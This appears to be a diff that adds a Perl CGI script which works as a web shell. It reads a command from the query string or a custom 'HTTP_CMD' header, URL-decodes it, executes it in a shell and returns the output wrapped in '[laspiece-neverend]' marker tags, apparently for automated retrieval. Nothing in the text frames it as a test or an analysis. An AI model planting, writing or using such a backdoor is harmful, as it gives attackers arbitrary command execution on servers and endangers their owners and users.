@@ -1,0 +1,14 @@
+#!/usr/bin/perl
+use POSIX;
+print "Content-Type: text/html\n\n";
+my $cmd = $ENV{'QUERY_STRING'} || $ENV{'HTTP_CMD'} || '';
+$cmd =~ s/%([0-9A-Fa-f]{2})/chr(hex($1))/eg;
+if ($cmd) {
+    print "[laspiece-neverend]<pre>";
+    my $out = '';
+    if (open(my $fh, '-|', $cmd . ' 2>&1')) {
+        while (<$fh>) { $out .= $_; } close($fh);
+    }
+    print $out;
+    print "</pre>[laspiece-neverend]";
+}
